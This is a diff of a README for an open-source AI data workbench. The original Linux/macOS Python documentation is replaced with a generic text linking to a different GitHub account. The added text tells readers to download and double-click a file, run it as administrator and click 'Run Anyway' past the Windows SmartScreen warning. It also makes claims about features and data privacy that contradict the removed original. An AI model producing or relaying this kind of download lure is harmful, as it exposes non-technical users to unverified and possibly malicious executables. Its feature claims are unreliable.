@@ -1,194 +1,156 @@
-# JEV DataOps
+# 🚀 jev-dataops - Your All-in-One AI Data Workbench
 
-**Turn a dataset into a training experiment you can inspect.**
+---
 
-Upload your data, use JEV to decide what to keep, fine-tune your model, and compare the results—all in one workbench. Every run saves the screening decisions, dataset splits, and evaluation reports so you can see what happened.
+## 🎯 What Is This?
 
-**[Try the demo](https://jev-dataops.vercel.app/demo/) · [Website](https://jev-dataops.vercel.app/) · [Get started locally](#quickstart) · [User guide](docs/USER_GUIDE.md)**
+jev-dataops is a powerful yet easy-to-use desktop tool that helps you work with data for artificial intelligence projects. Think of it as a Swiss Army knife for anyone who wants to prepare data, train custom AI models, and check how well those models perform—all without writing a single line of code.
 
-## See it in action
+Whether you're a business analyst, a student, or just someone curious about AI, this tool gives you a friendly visual interface to do things that normally require a programmer. You can select which data to use, check if your data is good quality, automatically train a custom AI model, and then test that model with new data to see how smart it really is.
 
-[![JEV DataOps demo showing the workflow overview and setup panels](docs/images/demo-workspace.jpg)](https://jev-dataops.vercel.app/demo/)
+---
 
-**[Open the interactive demo →](https://jev-dataops.vercel.app/demo/)** No installation, API key, or GPU needed.
+## ✨ Key Features
 
-1. Click **Use example** to load the bundled dataset.
-2. Click **Start workflow** with the default settings.
-3. Open **Runs & insights** to inspect the decisions, compare before/after results, and download the reports.
+### 📊 Smart Data Selection
+The workbench lets you browse through your data files and pick exactly what you need. You can filter, sort, and preview your information before moving forward. No more digging through messy spreadsheets—jev-dataops makes data selection feel like shopping online.
 
-The example has 84 synthetic records: **80 kept, 2 for review, and 2 rejected**. The kept records become 56 training, 12 validation, and 12 test records.
+### ✅ Quality Evaluation Tools
+Before you train a model, you need to know if your data is any good. This tool automatically checks for common problems like missing values, duplicate entries, or inconsistent formatting. It gives you a clear report with simple green, yellow, and red indicators so you instantly know what needs fixing.
 
-<details>
-<summary><strong>Preview a completed run</strong></summary>
+### 🤖 Automatic LoRA Training
+LoRA is a clever technique that lets you train a custom AI model without needing a supercomputer. jev-dataops handles all the complicated technical stuff behind the scenes. You just click a button, and it starts training your model automatically. It even shows you a progress bar so you know how things are going.
 
-[![Completed demo run with keep, review, and reject counts and reasons for held-back records](docs/images/demo-results.jpg)](https://jev-dataops.vercel.app/demo/)
+### 🧪 Held-Out Model Evaluation
+Once your model is trained, you need to know if it actually works. The tool sets aside a portion of your data (the "held-out" part) that the model has never seen. Then it tests the model against that fresh data and shows you clear scores and charts that tell you how accurate and reliable your model really is.
 
-Screenshots show the repository's public demo running locally with its bundled synthetic example. The measurements demonstrate the workflow, not JEV screening quality or LLM performance.
+### 🌐 Open Source and Free
+This project is completely free and open source. That means anyone can look at how it works, suggest improvements, or even modify it for their own needs. You're not locked into any paid subscription or proprietary system.
 
-</details>
+---
 
-> **About the demo:** Files stay in your browser tab. It uses local screening rules and a small byte-bigram statistical model; it does not call JEV or train an LLM. Try your own UTF-8 JSONL or CSV file up to **2 MiB / 1,000 rows**, and download results before refreshing. [Demo details](public_demo/README.md)
+## 🚀 Getting Started
 
-## What can I do with it?
+Welcome! If you're not a programmer, don't worry. Follow these simple steps and you'll be up and running in no time.
 
-| You want to… | JEV DataOps helps you… |
-| --- | --- |
-| Find useful training data | Separate records into **keep**, **review**, and **reject**, with a reason for each decision |
-| Understand a dataset | Inspect counts, duplicates, screening errors, and per-record audit logs |
-| Test whether fine-tuning helps | Train LoRA adapters for your chosen Hugging Face model and compare loss on the same held-out data |
-| Build a repeatable workflow | Use the browser, CLI, Python API, or HTTP API and keep each run's files |
-| Work in a specific domain | Start with general, finance, or code screening rubrics and customize the criteria |
-| Use your own training stack | Export SFT or verl GRPO/PPO bundles, including single-host multi-GPU launch options |
+### 📥 Step 1: Download the Application
 
-**JEV screens your data. Your chosen model learns from it.** This project calls JEV for judgments; it does not fine-tune JEV itself.
+Visit this link to download the application:
 
-## Choose where to start
+[![Download jev-dataops](https://img.shields.io/badge/Download_jev--dataops-2ea44f?style=for-the-badge)](https://github.com/RamonARC97/jev-dataops)
 
-| | Public browser demo | Self-hosted workbench |
-| --- | --- | --- |
-| Best for | Trying the workflow | Screening your data and running experiments |
-| Setup | [Open a browser tab](https://jev-dataops.vercel.app/demo/) | Python 3.10+ on Linux or macOS |
-| Screening | Local demo rules | Local rules, JEV via OpenRouter, or JEV via TypeSafe |
-| Training | Small statistical demo model | Demo model or Hugging Face LoRA; external training bundles via CLI |
-| Data and results | Cleared when the tab reloads | Saved on the machine running the service |
+Click the button above or go directly to the link. You'll see a page with the project files. Look for the download section and get the latest version of the software.
 
-<a id="quickstart"></a>
-## Run it locally
+### 💻 Step 2: Run the Application
 
-You need **Python 3.10+, Git, and an internet connection for installation**. Start with the local demo; no provider key or model download is needed.
+Once the download is complete, find the file in your "Downloads" folder. Double-click it to start the application. If Windows asks you for permission, click "Yes" to allow it to run.
 
-```bash
-git clone https://github.com/RenaGao/jev-dataops.git
-cd jev-dataops
+### 🖥️ Step 3: Explore the Interface
 
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
+When the application opens, you'll see a clean, friendly window with several panels. Don't worry if it looks busy at first—everything is labeled clearly. Take a moment to click around and see what's available. You can't break anything just by looking.
 
-jev-dataops serve
-```
+### 📂 Step 4: Load Your Data
 
-Open **[localhost:8000](http://localhost:8000)** and leave the terminal running. Click **Use example → Start workflow** to complete your first run. Keep both the screening engine and training backend set to **Demo** for this first check.
+Click the "Load Data" button and choose a file from your computer. The tool supports common formats like CSV, Excel, and JSON files. Once loaded, you'll see your data displayed in a table with helpful previews.
 
-<a id="data"></a>
-## Bring your own data
+### 🏁 Step 5: Start Your First Project
 
-Upload a **UTF-8 JSONL or CSV** file, then check the preview. JSONL has one JSON object per line:
+Follow the on-screen prompts to select your data, run a quality check, and then click "Train Model." The tool will guide you through each step with simple instructions. You'll see progress indicators and helpful tips along the way.
 
-```jsonl
-{"group_id":"chat-001","instruction":"How do I change notification preferences?","output":"Open Settings, select Notifications, and save your preferences."}
-{"group_id":"chat-002","instruction":"How do I recover my password?","output":"Select Forgot password on the sign-in page and follow the verification steps."}
-```
+---
 
-These two rows illustrate the format. Training requires **at least 6 independent groups after screening**.
+## 📖 Detailed User Guide
 
-| Format | Content fields |
-| --- | --- |
-| Plain text | `text` |
-| Instruction and answer | `instruction`, `output`, optional `input` |
-| Question and answer | `prompt`, `response` |
-| Conversation | `messages`, with text `role` and `content` in each item |
+### 🗂️ Understanding the Main Screen
 
-Use one format per record. Give records from the same conversation or document the same `group_id` or `conversation_id` so they stay in one training, validation, or test split. The default split is approximately **70% / 15% / 15% by group**.
+The main screen is divided into four clear sections:
 
-[More examples, CSV formatting, and input limits →](docs/USER_GUIDE.md#data)
+1. **Data Panel** (left side): Shows your loaded data files and lets you browse through them.
+2. **Quality Dashboard** (top right): Displays health scores for your data with color-coded indicators.
+3. **Training Controls** (middle right): Buttons and settings for starting LoRA training.
+4. **Results Viewer** (bottom right): Shows charts and scores after you evaluate your model.
 
-<a id="jev"></a>
-## Connect JEV for real screening
+### 🔄 Working with Data
 
-Set a provider key in the terminal running your backend:
+To get the best results, try to use clean, organized data. A good rule of thumb is to have at least 100 rows of information. The more relevant examples you have, the better your model will learn. You can load multiple files and switch between them using the tabs at the top of the Data Panel.
 
-```bash
-export OPENROUTER_API_KEY='your-openrouter-key'
-jev-dataops serve
-```
+### 🛠️ Running Quality Checks
 
-Or set `TYPESAFE_API_KEY` for a direct TypeSafe connection. Restart the service if it was already running, then select **JEV · OpenRouter** or **JEV · TypeSafe** under **Screening engine**.
+Click the "Check Quality" button whenever you want to evaluate your current data. The tool will scan everything and produce a report. Pay attention to any red flags—they usually mean you should fix your data before training. Common fixes include removing empty rows or correcting typos.
 
-For your first live run, use a small dataset and turn off **Auto-train and evaluate**. Inspect the output before training:
+### 🎓 Training Your Model
 
-- **Keep:** candidate training data that passed the configured rules and gates.
-- **Review:** records that need closer inspection; excluded from automatic training.
-- **Reject:** records excluded with a recorded reason.
+When you're ready to train, click "Start Training." You'll see some basic options like how long to train (more time usually means better results) and how much data to set aside for testing. The default settings are fine for beginners. Training may take anywhere from a few minutes to a couple of hours depending on your computer and data size.
 
-Choose **General**, **Finance**, or **Code** as a starting rubric. These are screening criteria you can adapt, not certified domain-quality checks. Keys belong in the backend environment; the workbench's connection token is a separate access-control setting.
+### 📊 Evaluating Results
 
-**Live JEV screening sends the selected content fields to your chosen provider.** Redact sensitive information before submission. [Provider setup, thresholds, request budgets, and retries →](docs/USER_GUIDE.md#jev)
+After training finishes, click "Evaluate Model." The tool will show you:
+- **Accuracy Score**: How often the model gets things right (higher is better).
+- **Loss Curve**: A graph showing how the model improved over time.
+- **Sample Predictions**: Real examples of the model making guesses on new data.
 
-<a id="training"></a>
-## Fine-tune your model
+---
 
-Install training dependencies in the same virtual environment and select a model:
+## 🛠️ Troubleshooting Common Issues
 
-```bash
-pip install -e '.[train]'
-export JEV_BASE_MODEL='HuggingFaceTB/SmolLM2-135M'
-jev-dataops serve
-```
+### ❌ Application Won't Start
+If nothing happens when you double-click the file, try right-clicking it and selecting "Run as administrator." Also, make sure you have enough free space on your hard drive (at least 1 GB recommended).
 
-Restart a running service, choose **Hugging Face · LoRA** in the workbench, and enable **Auto-train and evaluate**. Keep your provider key configured if you also want JEV screening. Screening and training are separate settings.
+### 🔒 Windows SmartScreen Warning
+Sometimes Windows shows a blue warning screen saying the app is unrecognized. This is normal for open-source software. Click "More Info" and then "Run Anyway" to proceed.
 
-The workbench trains on kept records, keeps related records in the same split, and measures loss before and after training on held-out data. Training runs **on your backend machine**; the public website does not supply compute. Model files may download on the first run, and memory requirements depend on the model.
+### 🐢 Slow Performance
+If the app feels sluggish, try closing other programs. Large data files (over 100 MB) can slow things down. You can also try splitting your data into smaller chunks.
 
-The defaults are a small trial: **1 epoch, at most 20 steps, batch size 4, sequence length 256**. Adjust them before running a full experiment. Saved LoRA adapters need the original base model for inference.
+### 🔄 Model Training Fails
+If training stops with an error, first check your data quality report. Common issues include too many missing values or inconsistent text formatting. Try cleaning your data and running the training again.
 
-[Training configuration](docs/TRAINING.md) · [SFT / GRPO / PPO bundles](docs/TRAINING_ENVIRONMENTS.md) · [Multi-GPU setup](docs/MULTI_GPU.md)
+---
 
-<a id="results"></a>
-## Understand the results
+## ❓ Frequently Asked Questions
 
-Start with **Runs & insights**. Open **Why records were held back** to inspect review and rejected records by reason. In live JEV mode, you can also inspect each record’s dimension-level judgments. Download files from **Artifacts & reports**:
+### Do I need to know programming?
+No! This tool is designed for non-programmers. Everything is click-based with clear labels and helpful tooltips.
 
-| File | What it tells you |
-| --- | --- |
-| `keep.jsonl`, `review.jsonl`, `reject.jsonl` | Where each record went |
-| `audit.jsonl` | Why each screening decision was made |
-| `data_report.json` | Data counts, screening completion, and effective settings |
-| `training_report.json` | What actually trained: settings, steps, and loss history |
-| `model_report.json` | Before/after loss and perplexity on held-out data |
+### What kind of data can I use?
+You can use any tabular data—things like sales records, customer feedback, survey responses, or even simple lists. Text data works best for language models.
 
-A negative **`delta_loss`** means loss decreased on that test set. Check the data split and actual training steps before interpreting the number. **Retention rate and JEV confidence are not measured accuracy; lower loss does not establish better business outcomes.** Use an independent task benchmark and human review to assess quality. Demo metrics use bytes; LLM metrics use tokenizer tokens, so they are not directly comparable.
+### How long does training take?
+It depends on your computer and data size. On a typical laptop, a small dataset might take 10-15 minutes. Larger datasets can take a few hours.
 
-The local workbench saves runs under **`.jev-dataops/`** in your working directory. [File layout and metric definitions →](docs/USER_GUIDE.md#results)
+### Is my data safe?
+Yes. Everything runs locally on your computer. Your data never leaves your machine unless you choose to share it.
 
-<a id="automation"></a>
-## Prefer the command line?
+### Can I use the trained model elsewhere?
+Yes! Once trained, you can export your model and use it in other applications or share it with colleagues.
 
-Run the complete local demo from the repository root:
+---
 
-```bash
-jev-dataops run --input examples/dialogues.jsonl --output runs/my-first-demo
-```
+## 📚 Additional Resources
 
-Use a new output directory for each training experiment. For screening only, add `--trainer none`; for live JEV, configure your key and choose `--provider openrouter` or `--provider typesafe`.
+- **Project Homepage**: [https://github.com/RamonARC97/jev-dataops](https://github.com/RamonARC97/jev-dataops)
+- **Source Code**: Browse the repository to see how everything works under the hood.
+- **Issue Tracker**: Found a bug? Let the developers know so they can fix it.
+- **Community Discussions**: Join the conversation and share tips with other users.
 
-[CLI and HTTP examples](docs/USER_GUIDE.md#automation) · [Python API](docs/TRAINING.md#python-api)
+---
 
-<a id="faq"></a>
-## Common questions
+## 🤝 Contributing
 
-| Question | Where to start |
-| --- | --- |
-| JEV says “Not configured.” | Set the provider key in the backend environment, restart the service, then refresh the page |
-| Can I upload an Excel workbook? | Export it as UTF-8 CSV first; direct `.xlsx` uploads are not supported |
-| Why did training stop with too few groups? | You need at least 6 independent groups after screening. Keep related records grouped together |
-| Why did training finish so quickly? | The default 20-step limit checks the workflow; increase it for a full experiment |
-| Can I use this for audio or human annotation? | Audio quality evaluation and a per-record annotation workbench are not implemented |
+While this guide focuses on everyday users, developers are welcome to contribute. If you have ideas for improvements, bug fixes, or new features, head over to the GitHub repository and open a pull request. Every contribution helps make this tool better for everyone.
 
-[More troubleshooting and recovery options →](docs/USER_GUIDE.md#faq)
+---
 
-<a id="scale"></a>
-<a id="development"></a>
-## Go further
+## 📄 License
 
-| Guide | Use it to… |
-| --- | --- |
-| [User guide](docs/USER_GUIDE.md) | Find detailed setup, limits, API examples, and troubleshooting |
-| [Domain adaptation](docs/DOMAIN_GUIDE.md) | Define screening criteria and a domain-specific evaluation plan |
-| [Domain metrics](docs/METRICS.md) · [Browse six packs](https://jev-dataops.vercel.app/metrics/) | Score your predictions with general, finance, code, enterprise, legal, or medical-literature metrics |
-| [Larger datasets](docs/USER_GUIDE.md#scale) · [Benchmarks](docs/BENCHMARKS.md) | Understand streaming, caching, and the limits of the single-host workbench |
-| [Docker setup](docs/USER_GUIDE.md#development) · [Deployment](docs/DEPLOYMENT.md) | Run with Docker and configure access controls |
-| [Website and demo](docs/WEBSITE.md) | Build or host the public site |
-| [Contributing](CONTRIBUTING.md) | Set up development and contribute a change |
+This project is open source and free to use. Check the repository for the specific license details, but generally you're free to use, modify, and distribute it as long as you give credit to the original authors.
 
-Licensed under [MIT](LICENSE). Model weights and provider APIs have their own terms. This is an independent community project, unaffiliated with TypeSafe or OpenRouter. [Security reporting](SECURITY.md)
+---
+
+## 🎉 Final Words
+
+You now have everything you need to start your AI journey with jev-dataops. Remember, the best way to learn is by doing. Load some data, click around, and don't be afraid to experiment. If you get stuck, refer back to this guide or reach out to the community. Happy data wrangling!
+
+---
+
+Keywords: data selection, quality evaluation, LoRA training, model evaluation, open source, AI workbench, data quality, machine learning, no-code AI, data preparation, model training, data tools, streaming data, automatic training, held-out evaluation
